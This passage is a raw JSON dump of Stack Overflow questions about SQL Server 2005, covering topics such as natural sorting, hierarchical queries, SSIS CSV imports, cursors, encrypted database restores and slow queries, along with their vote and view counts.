level?</p>\n\n<p>I need to simulate an insert into a table with an Identity column as the pk. My current table doesn't have an Identity field as the pk but it needs to act like it does. So i need to get the max of the pseudo ID field and add 1 then insert the next row.</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":305,"score":1,"question_id":3616454,"title":"SQL Server: COLLATE CS->CI performance vs UPPER","body":"<p>What's better to use when comparing columns that could contains values with different cases? \nIs Collate faster?\nJust trying to figure this out because in our project with tons of data comparisons.\nwe use:</p>\n\n<pre><code>select * from table t1, table t2 where \nt1.col1 collate SQL_Latin1_General_CP1_CI_AS = t2.colb collate SQL_Latin1_General_CP1_CI_AS \n</code></pre>\n\n<p>why we can't rewrite as:</p>\n\n<pre><code>select * from table t1, table t2 where \nUPPER(t1.col1)  = UPPER(t2.colb)\n</code></pre>\n"},{"tags":["sql-server-2005","http","request","sup","data-change"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":13123858,"title":"Implement triggers in SQL Server 2005 for DCN on SUP","body":"<p>I'm developing a Mobility project with Sybase Unwired Platform (SUP). The backend is SQL Server 2005 and the cache policy is DCN.</p>\n\n<p>The EIS has to send the HTTP request with JSON format to our server. I have done tests calling the http request in the browser and works fine.</p>\n\n<p>Now, I would like to implement some triggers or functions to:</p>\n\n<ul>\n<li>Populate the CDB with the initial data.</li>\n<li>Detect when any change occurs in a table and execute a function to do the request.</li>\n</ul>\n\n<p>The logical has to include if the status message of SUP is OK or not. If is not OK, has to retry the request, save into a log, or something...</p>\n\n<p>I don't find anything on Internet or Sybase documentation, only for SAP.</p>\n\n<p>Have you got any example for SQL Server?</p>\n\n<p>Thank you.</p>\n"},{"tags":["c#","unit-testing","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13123082,"title":"SQL script compatible SQL Server 2005","body":"<p>I have an application and this will \"install\" some stored procedures into a local database.</p>\n\n<p>I want to make a unit test to validate the stored procedures so that the will be valid from SQL Server 2005 and up.</p>\n\n<p>Is there a way to do this with / without SQL Server?</p>\n"},{"tags":["sql-server","sql-server-2005","sorting","natural-sort"],"answer_count":15,"favorite_count":10,"up_vote_count":19,"down_vote_count":0,"view_count":13080,"score":19,"question_id":34509,"title":"Natural (human alpha-numeric) sort in Microsoft SQL 2005","body":"<p>We have a large database on which we have DB side pagination. This is quick, returning a page of 50 rows from millions of records in a small fraction of a second.</p>\n\n<p>Users can define their own sort, basically choosing what column to sort by.  Columns are dynamic - some have numeric values, some dates and some text.</p>\n\n<p>While most sort as expected text sorts in a dumb way. Well, I say dumb, it makes sense to computers, but frustrates users.</p>\n\n<p>For instance, sorting by a string record id gives something like:</p>\n\n<pre><code>rec1\nrec10\nrec14\nrec2\nrec20\nrec3\nrec4\n</code></pre>\n\n<p>...and so on.</p>\n\n<p>I want this to take account of the number, so:</p>\n\n<pre><code>rec1\nrec2\nrec3\nrec4\nrec10\nrec14\nrec20\n</code></pre>\n\n<p>I can't control the input (otherwise I'd just format in leading 000s) and I can't rely on a single format - some are things like \"{alpha code}-{dept code}-{rec id}\".</p>\n\n<p>I know a few ways to do this in C#, but can't pull down all the records to sort them, as that would be to slow.</p>\n\n<p>Does anyone know a way to quickly apply a natural sort in Sql server?</p>\n"},{"tags":["sql-server","sql-server-2005","query"],"answer_count":7,"favorite_count":5,"up_vote_count":10,"down_vote_count":0,"view_count":8039,"score":10,"question_id":235515,"title":"Hierarchical Queries in SQL Server 2005","body":"<p>Way back when I was working in an Oracle shop I took the CONNECT_BY for granted.  Now I'm stuck working with SQL Server 2005 and have some nasty object hierarchies.  Specifically, we have a self referencing table where all child records have a column with their parent's id.  Currently we have a view that maps children to levels in the hierarchy and a nasty query that does the heavy lifting to connect parents with their children.  While this method works, it is far from elegant and reeks of taint.  I'm just curious how other people retrieve hierarchical data from SQL Server 2005.</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13087929,"title":"SSIS 2005 - how to skip rows from input flat file programmatically","body":"<p>I need to import a .csv file into a SQL table.</p>\n\n<p>The  input file looks like:</p>\n\n<pre><code>gru,212,BNP10H,bnp10h,1,01,Gestore 01\nlimGru,2012-09-12,17:21:05,kair103,,,,\nlimGru,2012-10-19,09:45:03,kair028,,,,\nlimGru,2012-10-19,09:45:06,kair028,,,,\nlimGru,2012-10-19,09:45:14,kair028,,,,\ngru,207,BNP50E,bnp 50 equity,1,01,Gestore 01\nlimGru,2012-09-13,11:49:58,kair022,,,,\nlimGru,2012-10-05,15:20:11,kair048,,,,\nlimGru,2012-10-17,09:23:14,kair048,,,,\n</code></pre>\n\n<p>and i would import only the rows that begin with \"limGru\".</p>\n\n<p>Any idea in how to implement my task?</p>\n\n<p>EDITED: please note that the rows have different number of columns, depending on the first filed (\"gru\" or \"limGru\")</p>\n\n<p>EDITED 2: Please also take a look here:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/6294563/ssis-how-to-process-an-csv-input-file-with-a-variable-number-of-columns-based\">SSIS =- How to process an CSV input file with a variable number of columns based on record type (Header, Detail, Trailer)</a></p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13072021,"title":"Slow running query on my machine only","body":"<p>I'm running a simple <strong><code>select * from table</code></strong> query against Microsoft SQL Server 2005. The table has about 41000 records with a PK clustered index and I'm using windows integrated authentication.</p>\n\n<ul>\n<li><p>When I run this on my machine using Microsoft SQL Server Management Studio the query completes in about 1h45m. I have tried swithing from grid to text output, running it from command line using <code>SQLCMD</code> also tried ececuting <code>DBCC USEROPTIONS</code>, <code>DBCC DROPCLEANBUFFERS</code>, <code>DBCC FREEPROCCACHE</code> prior the query... nothing changed the speed of the query.</p></li>\n<li><p>When I run it from coleague workstation using my credentials the query completes normaly in no time. If a coleague runs the query on my workstation using their credentials the query is very slow as described above.</p></li>\n</ul>\n\n<p>I'm running out of ideas how to troubleshoot this problem. Somehow the problem seem to be linked to my machine, but I can not make sense out of it. Please also consider the following:</p>\n\n<ul>\n<li>I checked and made sure ODBC tracing is not enabled on my machine (Win7-64bit). I have installed SQL Server client tools with Microsoft Management Studio 2008 R2 and this is what I'm using to query the database.</li>\n<li>I also used VS2010 to run the same sql query and the result is identical.</li>\n<li>I run the query against copy of the same table/database but on a different server and the issue persists.</li>\n<li>When I run <strong><code>select count(*) from table</code></strong> - the query completes normaly with no delay.</li>\n<li>When I run a trace with SQL Server Profiler the query is just a long running query - I can not see anything abnormal.</li>\n<li>When I run the query in MS SQL Server Management Studio using text out put I can see after the initial buffer of about 85 records the subsequent records arrive in bulk of about 400 records at a time. For example 85 -> 407 -> 804 -> 1210 -> 1605 -> 1897 -> 2161 -> 2753 -> 3051 -> 3342 -> 3676 -> 4002 etc. In comparison of the coleagues workstation where you can see the records painted as continuous stream as the data arrives!???</li>\n<li>I also compared the actual Query Execution Plans on my machine and the other where the query is running normally - they appear to be identical.</li>\n</ul>\n\n<p>Could anyone make sense what could be going wrong here? Why running this from my machine is very slow but it executes normally from another workstation?... \nAny suggested actions steps to troubleshoot this problem?</p>\n\n<p>Thanks to everyone in advance!</p>\n"},{"tags":["sql-server-2005","visual-studio-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13119795,"title":"How to create parent-child relationship in sql server2005?","body":"<p>If i have two tables in my sql server 2005 and i need to create parent-child relationship between those tables so that i can retrieve that data using binding navigator in vb.net 2008?</p>\n"},{"tags":["vb.net","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13119825,"title":"Use of one bindingnavigator","body":"<p>I want to retrieve data from two different tables on one form in VB.NET. I am using SQL server 2005 database.\nAlso I want to use navigator to navigate the records that are retrieved from the two tables. How to accomplish this? </p>\n\n<p>Can anyone help?\nThanks in advance.</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":3,"view_count":34,"score":-3,"question_id":13117898,"title":"need help in joining values of 2 sql queries","body":"<p>m want to add the below query result and have to show in grid after year change</p>\n\n<p>please tell me how to do</p>\n\n<pre><code>SELECT 15- sum(EL) as el, 1 - sum(CL) as cl, 14 - sum(ML) as ml FROM attendance\n//current value of this query\nSELECT 15- sum(EL) as el, 1 - sum(CL) as cl, 14 - sum(ML) as ml\n//new values of this query\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5489,"score":0,"question_id":388497,"title":"How to switch sql-2005 Select Case When T-sql Naming?","body":"<pre><code>select \n(Case Remark01\nWhen 'l1' then type1\nwhen 'l2' then type2\nend) AS [?] --Remark .....want to switch name in here\nfrom mytable\n</code></pre>\n\n<p>Example ....</p>\n\n<pre><code>select \n(Case level\nWhen 'l1' then type1 ('l1' mean check constant string)\nwhen 'l2' then type2(('l2' mean check constant string))\nend) AS <b>(Case when 'l1' then [type01] Else [type02])</b>\nfrom mytable\n</pre>\n\n<pre>select level,type1,type2 from mytable\n</code></pre>\n\n<p>I using two program this mytable<br>\none program is want to show menu only type1 only<br>\none program is want to show menu only  type2 only<br>\nI using one view using two program..</p>\n"},{"tags":["sql","sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1766,"score":0,"question_id":829221,"title":"Force Package Failure From Send Mail Task in SSIS","body":"<p>Is there any way to force a package to fail from a Send Mail Task? We have a package whose last step is to send a failure message using the Send Mail Task if certain criteria are met. Usually, we create another Script Task directly after the Mail Task which just fails the package using code:</p>\n\n<pre><code>Dts.TaskResult = Dts.Results.Failure\n</code></pre>\n\n<p>Is there a way to eliminate the Script Task and fail the package directly from the Send Mail Task?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":13118217,"title":"How to merge two stored procedure data","body":"<p>I have 2 stored procedures, each SP returns 2 data set with same schema.</p>\n\n<p>data are like </p>\n\n<pre><code>Stored procedure 1\n</code></pre>\n\n<p><code>Table1</code></p>\n\n<pre><code>ID       Name\n1        Apple\n2        Sony\n3        DELL\n</code></pre>\n\n<p><code>Table2</code></p>\n\n<pre><code>OrderID  CustomerName\n101        AB Stores\n202        Sony World\n301        PC House \n</code></pre>\n\n<p>Stored procedure 2</p>\n\n<p><code>Table1</code></p>\n\n<pre><code>ID       Name\n21        HP\n32        LG\n34        ACCER\n</code></pre>\n\n<p><code>Table2</code></p>\n\n<pre><code>OrderID  CustomerName\n1301        X-PC World\n2202        Your PC House\n3301        Ajant Stores\n</code></pre>\n\n<p>Now I want to merge data like this inside other stored procedure</p>\n\n<p>meargeData1 = SP1.Table1 + SP2.Table1 </p>\n\n<p>meargeData2 = SP1.Table2 + SP2.Table2</p>\n\n<p>please suggest me hot I can achieve it . </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13118273,"title":"Is there a way to restore sql server to default settings?","body":"<p>Basically i want all constraints, rules, keys , databases everything removed i want it as it was on the day i installed it . I do not want to re install it. Simply deleting database might not fix the problem i have</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13060272,"title":"How to process a CSV file with a number of columns changing in SSIS?","body":"<p>I have a complete CSV file that for instance have 6 columns:</p>\n\n<pre><code>Rec ID | Charge Category | Charge Type Category | Product Name | Account No | Cost \n</code></pre>\n\n<p>I've been running SSIS no problem with this condition.</p>\n\n<p>However, we found that one of the CSV file that is using less column than we have for instance:</p>\n\n<pre><code>Rec ID | Charge Type Category | Product Name |Cost\n</code></pre>\n\n<p>How do we handle this cause using \"Flat File Connection Manager\" type of connection is not working ?!?!</p>\n\n<p>Any other approach that we need to explore?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","performance","full-text"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":284,"score":0,"question_id":1875126,"title":"Any idea why contains(...) querys so slow in SQL Server 2005","body":"<p>I've got a simple select query which executes in under 1 second normally, but when I add in a contains(column, 'text') into the where clause, suddenly it's running for 20 seconds up to a minute. The table it's selecting from has around 208k rows.</p>\n\n<p>Any ideas what would cause this query to run so slow with just the addition of the contains clause?</p>\n"},{"tags":["sql-server-2005","jndi","kettle"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":256,"score":0,"question_id":6998481,"title":"JNDI exmple for connecting to a named instance of MsSQL","body":"<p>We're using Pentaho Data Integration(Open source ETL tool) and are trying to use a JNDI connection to connect to a MS SQL 2005 database.  If we use a default instance on the server it worked fine, however issue that we are having is trying to get it to connect to a named instance.</p>\n\n<p>If you could provide an example or somewhere to look we'd be grateful. </p>\n\n<p>Thanks. </p>\n"},{"tags":["sql-server-2005"],"answer_count":9,"favorite_count":5,"up_vote_count":4,"down_vote_count":0,"view_count":10734,"score":4,"question_id":1057389,"title":"SQL query to find Missing sequence numbers","body":"<p>I have column named \"sequence\" . I have data in this column like 1,2,3,4,5,7,9,10,15 .</p>\n\n<p>I need to find out missing sequence numbers from table .</p>\n\n<p>what is the sql query to find missing sequence numbers from table ? I am expecting results like 6,8,11,12,13,14</p>\n\n<p>Thanks a lot</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I just need to return one column like</p>\n\n<h2>Missing numbers</h2>\n\n<p>6<br />\n8<br />\n11<br />\n12<br />\n13<br />\n14  </p>\n\n<p>I am using only one table </p>\n\n<p>I tried this query but am not getting the expected result.Here is the query</p>\n\n<pre><code>select de.sequence + 1 as sequence from dataentry as de \nleft outer join dataentry as de1 on de.sequence + 1 = de1.sequence\nwhere de1.sequence is null  order by sequence asc;\n</code></pre>\n"},{"tags":["c#","sql-server-2005","c#-4.0","ado.net"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":50,"score":-2,"question_id":13106866,"title":"how to create alphnumerical unique ID in c#","body":"<p>I am creating a dealer form using c#\nIn which I wanted unique dealer Id for each dealer\nplease help me how to auto assign a unique code to \nnew member sequentially in the format </p>\n\n<blockquote>\n  <p>D1,D2, D3, D4,..</p>\n</blockquote>\n\n<p>I want to use disconnected enviorenment in ADO.net and \ni want to save that id in SQL server 2005</p>\n\n<p><a href=\"http://i.imgur.com/xUi9c.jpg\" rel=\"nofollow\">http://i.imgur.com/xUi9c.jpg</a></p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13073678,"title":"how to pull records with special characters in SQL (2005) Server?","body":"<p>I am trying to pull records that contain special characters like:</p>\n\n<pre><code>*,  +,  -, . (dot), ',  , /,  0-9\n</code></pre>\n\n<p>But did not have much sucess so far.</p>\n\n<p>The column is called People_Name and the names supposed to be in this format: Lastname, Firstname. For example, Smith, Johnson. However, due to data entry error,\nsome names show up as:</p>\n\n<pre><code> 681, Smith,  *S-Sean, Tom,   +, John,   -, Tim,  ., .,  /, Celo,  0-9999,\n Maria,  ', Irving, and sometime as 'Unknown, Alexis.\n</code></pre>\n\n<p>My current query (SQL Server 2005) is </p>\n\n<pre><code>Select People_name\n  from mytable\n where (People_name LIKE '%*%' \n    OR People_name LIKE '%-,%'\n    OR People_name LIKE '%+%'\n    OR People_name LIKE '%/%'\n    OR People_name LIKE '%unknown%')\n</code></pre>\n\n<p>I can keep adding the LIKE list but I am sure there is a way in SQL server that can pull the records with those special characters. With more than 10 million records in the table, \nit is quite repeated to sort and look for those special characters then use the LIKE operator like above.</p>\n\n<p>Can some one please look into it?</p>\n"},{"tags":["tsql","sql-server-2005","ddl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":13106647,"title":"TSQL DDL constraint error: \"Line 12: Incorrect syntax near '('.\"","body":"<p>I'm trying to create a table. Here's the creation DDL. I'm encountering an error when I run this on SQL Server 2005 MSDE. I have no idea why - it works fine on 2008/2012.</p>\n\n<pre><code>CREATE TABLE [dbo].[CuCompanyHolidays](\n    [HolidayID] [int] IDENTITY(1,1) NOT NULL,\n    [HolidayName] [varchar](255) NULL,\n    [HolidayDate] [datetime] NULL,\n    [PartOff] [float] NULL,\n    [CreateDate] [datetime] NULL,\n    [LastUpdate] [datetime] NULL,\n CONSTRAINT [PK_cuCompanyHolidays] PRIMARY KEY CLUSTERED \n(\n    [HolidayID] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n\nGO\n</code></pre>\n\n<blockquote>\n  <p>Msg 170, Level 15, State 1, Line 12\n  Line 12: Incorrect syntax near '('.</p>\n</blockquote>\n\n<p>Here's the line the error is highlighting:</p>\n\n<blockquote>\n  <p>)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON PRIMARY</p>\n</blockquote>\n\n<p>How can I resolve this?</p>\n"},{"tags":["sql-server","sql-server-2005","encryption","symmetric-key"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3404,"score":3,"question_id":209927,"title":"SQL Server 2005 - Restoring an encrypted DB on a different server","body":"<p>I have backed up an encrypted DB (symmetric key/certificate) and \nrestored it on a different server. </p>\n\n<p>Unfortuantely we're having problems with the decryption... hoping \nsomeone can help. </p>\n\n<p>In the restored db, I can see the Symmetric Key and the Certificate in \nSSMS, but when I try to Open the key using the cert ( open symmetric \nkey KeyA decryption by certificate CertB )I get the \nfollowing <em>very descriptive</em> error: </p>\n\n<p>Msg 15466, Level 16, State 1, Line 1 \nAn error occurred during decryption. </p>\n\n<p>Any ideas?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c#","sql-server-2005","visual-studio-2008","database-connection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13100678,"title":"Unable to create new SQL Server 2005 database in Visual Studio Team System 2008","body":"<p>I was having some problems with SQL Server 2005, so I re-installed it. Now, in Visual Studio 2008 (Team System), when I right-click <code>Data Connections</code> in <code>Server Explorer</code> &amp; click on <code>Create new SQL Server Database</code>, nothing happens. </p>\n\n<p>Moreover, when I click the <code>Add connection</code> option, the following message pops up:         </p>\n\n<blockquote>\n  <p><em>The System.Windows.Forms.Design.IUIService service could not be\n  found.</em></p>\n</blockquote>\n\n<p>I'm clueless about the problem. Please help. </p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13072797,"title":"Read data from database and display it in a txt file","body":"<p>I have a table made in SQL Server 2005 which has the following columns:</p>\n\n<pre><code>Fname (char (50)),\nMailFrom (char (50)),\nMailTo (char (50)),\nSubject (char (50)),\nMBody (char (100)),\nMailID (int)\n</code></pre>\n\n<p>After entering rows into the table, I want to extract and store them in either a text file/ document file/ window form having text fields for each column.</p>\n\n<p>Any suggestions to get the best possible way to extract the data from the database and save it on a file.</p>\n"},{"tags":["sql-server-2005","query-analyzer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13099108,"title":"Did not find query analyzer in SQL Server 2005 Express edition","body":"<p>I have downloaded the SQL Server 2005 Express edition and I was not able to fine query analyzer to run the queries or design the database.</p>\n\n<p>Please can anyone help on this.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","join"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13098731,"title":"SQL Join Issue return DISTINCT Names","body":"<p>I have the following two tables with data like so:</p>\n\n<pre><code>Table Values\n var_label\n 1\n 2\n 2\n 1\n 3\n\nTable Codes\nvar_code\n1\n2\n4\n2\n</code></pre>\n\n<p>I need to join these tables and get the distinct result.  The var_label and var_code are equal pieces of data.  I want to have the joined output like so:</p>\n\n<pre><code> MyColumn\n1\n2\n3\n4\n</code></pre>\n\n<p>Wht's the best way to do this?</p>\n"},{"tags":["sql","sql-server-2005","tsql","stored-procedures"],"answer_count":6,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":17732,"score":7,"question_id":200195,"title":"How can I determine the status of a job?","body":"<p>I have a Stored procedure which schedules a job. This Job takes a lot of time to get completed (approx 30 to 40 min). I need to get to know the status of this Job.\nBelow details would help me</p>\n\n<p>1) How to see the list of all jobs that have got scheduled for a future time and are yet to start</p>\n\n<p>2) How to see the the list of jobs running and the time span from when they are running</p>\n\n<p>3) How to see if the job has completed successfully or has stoped in between because of any error.</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":7782,"score":1,"question_id":275737,"title":"How do I compare two datetime fields in SQL Server 2005?","body":"<pre><code>DECLARE  @p_date DATETIME\nSET      @p_date = CONVERT( DATETIME, '14 AUG 2008 10:45:30',?)\n\nSELECT   *\nFROM     table1\nWHERE    column_datetime = @p_date\n</code></pre>\n\n<p>I need to compare date time like:</p>\n\n<pre><code>@p_date=14 AUG 2008 10:45:30\ncolumn_datetime=14 AUG 2008 10:45:30\n</code></pre>\n\n<p>How can I do this?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13098008,"title":"have to get data from VISIT_Table filter with only date no time","body":"<pre><code>\"SELECT * FROM VISIT_Table WHERE ID='\" + ID + \"' AND DATE ='\" + DateTime.Now.ToString(\"yyyy-MM-dd\") + @\"'\";\n</code></pre>\n\n<p>Above is my query I have to get data from <code>VISIT_Table</code> filter with only date no datetime..</p>\n\n<p>In database <code>visit_date</code> stores <code>2012-10-27 11:10:35</code> I have to get data with only date no time</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":58,"score":2,"question_id":13096882,"title":"SQL Server SQL multiplying Sum results when join multiple tables","body":"<p>It is greatly appreciated if any one can help me out with this. </p>\n\n<p>I am trying to get results from one table where i use sum() function and joins two more tables. My results are multiplying on sum column. Here is how my tables look like and my desired result</p>\n\n<p><strong>Table 1</strong></p>\n\n<pre><code>[Id]   [Account_nbr]  [date]       [seq#]  \n------------------------------------------\n[1234]  [$60] [4321]  [10-15-2012]  [1]\n[1234]  [$20] [4321]  [10-15-2012]  [2]\n[1234]  [$30] [4321]  [10-15-2012]  [3]\n[2345]  [$40] [9876]  [10-15-2012]  [1]\n[3456]  [$50] [6543]  [10-15-2012]  [1]\n</code></pre>\n\n<p><strong>Table2</strong> </p>\n\n<pre><code>[ID]      [cust_num]\n---------------------        \n[1234]     [8765]\n[2345]     [8766]\n[3456]     [8767]\n</code></pre>\n\n<p><strong>Table 3</strong></p>\n\n<pre><code>[cust_num]     [account_nbr]\n-------------------------------     \n[8765]        [4321]\n[8767]        [9876]\n</code></pre>\n\n<p>My desired result will be join <code>Table 1</code>, <code>Table 2</code> using <code>ID</code> and join <code>Table 3</code> using <code>cust_num</code> and see <code>account_nbr</code> from <code>table 1</code> is matching with <code>account_number</code> in <code>Table 3</code> and if match found then </p>\n\n<pre><code>sum(Table1.Amount),Table1.Id,Table1.Account_nbr,Table1.Date\n</code></pre>\n\n<p>I was using a SQL query like this but my sum results are multiplying</p>\n\n<pre><code>SELECT \n    sum((Table1.Amount), Table1.Id, Table1.Account_nbr, Table1.Date\nFROM \n    table1, table2, table3 \nWHERE \n    table1.id = table2.id    \n    AND table2.cust_num = table3.cust_num    \n    AND table1.account_nbr = table3.account_nbr     \nGROUP BY\n    table1.id,table1.account_nbr,table1.date    \nORDER BY \n    table1.date DESC\n</code></pre>\n\n<p>But like I said earlier my results are multiplying. My desired results in tabular form as mentioned below </p>\n\n<pre><code>[Amount]     [Id]     [Account_nbr]    [Date]\n---------------------------------------------------\n[$110]       [1234]   [4321]           [10-15-2012]\n[$40]        [2345]   [9876]           [10-15-2012]\n</code></pre>\n\n<p>The <code>id = 3456</code> should not be there because the corresponding <code>account_nbr</code> from <code>table1</code> not exist in <code>table3</code>.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13096707,"title":"Passing data into nested cursors in TSQL","body":"<p>I have a cursor that gets data and fetches it into @data_table.  Then in the while loop I want to pass that @data_table into another cursor (as the table name) to run some more processing. I keep getting a declare @data_table error. How do I fix this?</p>\n\n<pre><code>DECLARE @var_name varchar(50)\nDECLARE @data_table varchar(50)\nDECLARE @data_value varchar(50)\n\nDECLARE curDiscreteVars CURSOR LOCAL\n\nFOR SELECT DISTINCT v.var_name, v.data_table \n    FROM dbo.vars v\n    GROUP BY v.var_name, v.data_table\n\n-- Loop through cursor, translating variable values as needed, and generate counts for each val_code for a variable\nOPEN curDiscreteVars\nFETCH NEXT FROM curDiscreteVars \n    INTO @var_name, @data_table\n\nWHILE @@FETCH_STATUS  = 0\nBEGIN\n    --loop through all possible data values\n\n    DECLARE curValues CURSOR LOCAL\n\n    FOR SELECT DISTINCT @var_name  \n        FROM @data_table\n\n    OPEN curValues\n    FETCH NEXT FROM curValues \n        INTO @data_value\n\n    WHILE @@FETCH_STATUS  = 0\n    BEGIN\n        print @var_name\n\n\n\n        FETCH NEXT FROM curValues \n        INTO @data_value\n    END\n\n    CLOSE curValues\n    DEALLOCATE curValues\n\n    FETCH NEXT FROM curDiscreteVars \n    INTO @var_name, @data_table\nEND\n\nCLOSE curDiscreteVars\nDEALLOCATE curDiscreteVars\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","temporary-tables","alter-table"],"answer_count":5,"favorite_count":4,"up_vote_count":40,"down_vote_count":0,"view_count":72702,"score":40,"question_id":659051,"title":"check if temp table exist and delete if it exists before creating a temp table","body":"<p>I am using the following code to check if the temp table exists and drop the table if it exists before creating again. It works fine as long as I don't change the columns. If I add a column later, it will give an error saying \"invalid column\". Please let me know what I am doing wrong.</p>\n\n<pre><code>IF OBJECT_ID('tempdb..#Results') IS NOT NULL\n    DROP TABLE #Results\n\nCREATE TABLE #Results\n(\n    Company             CHAR(3),\n    StepId              TINYINT,    \n    FieldId             TINYINT,\n)\n\nselect company, stepid, fieldid from #Results\n</code></pre>\n\n<p>If I run the above code, it works fine. Now let's say I add a column fieldname and use that field in the select statement, it gives an error. </p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":35,"score":-2,"question_id":13091822,"title":"insert new values without overwriting previous values sql","body":"<p>I have a table i need to add info to for 450 rows, i can identify each row with a unique order number and only need to update 4 of the rows on the table for each order number.</p>\n\n<pre><code>update ordercontacts\nset firstname = 'joe', lastname = 'smith', email = 'joesmith@smith.com', contacttypeid = 13\nwhere orderid = 1284480\n</code></pre>\n\n<p>this just replaced my values so i had to fix that </p>\n\n<p>i tried this as well    </p>\n\n<pre><code>insert into ordercontacts\n(firstname, lastname, email, contacttypeid)\nvalues\n('joe', 'smith', 'jowsmith@smith.com', 13)\nwhere orderid in (1284480)\n</code></pre>\n\n<p>but the syntax is not correct and im not sure what the correct syntax would be</p>\n\n<p>I had thought something like this would work but it doesnt obviously.  Can anyone help me out? Each of the order numbers already has a different contact attached to it, i basically want the end result to be like this:</p>\n\n<pre><code>order     firstname   lastname        email               contacttypeid\n1284480   joe        smith      joesmith@smith.com         13\n1284480   steve      andrews      steve@steve.com         11\n</code></pre>\n\n<p>Im looking to add a new contact on top of one that already exists for each order number.  The syntax for the update i have is only replacing the info that is already there.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":13088621,"title":"sql server updating new column based on another column from same table","body":"<p>I have a table with composite primary key based on three columns.</p>\n\n<p><code>(Unit, Account, service)</code></p>\n\n<p>I have another two columns: <code>DOB</code> (this holds date of birth) &amp; <code>Age</code> (this is a new int column which needs to be updated based on DOB and the result will be integer value of years)</p>\n\n<p>I know how to retrieve the reslt for Age</p>\n\n<pre><code>select datediff(Year,DOB,GETDATE()) as AGE\n</code></pre>\n\n<p>But not sure how to update entire table based on the rows DOB data.</p>\n\n<p>Columns are <code>Unit, Account, Service, DOB, Age</code></p>\n"},{"tags":["c#","sql-server-2005","asp.net-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13076980,"title":"which of following code is better performance wise in ASP.NET 2.0","body":"<p>I have been using a datatable to display some fields from SQL 2005 database table in my website which is built in ASP.NET 2.0.</p>\n\n<p>lately its been throwing timeout errors saying all the max connection pools have been reached.</p>\n\n<p>here is my code using the SqlDataAdapter performing this on a Repeater OnDataItemBound.</p>\n\n<pre><code>#region repeater item databound\n    protected void rProducts_OnItemDataBound(object source, RepeaterItemEventArgs e)\n    {\n\n        // displaying sale 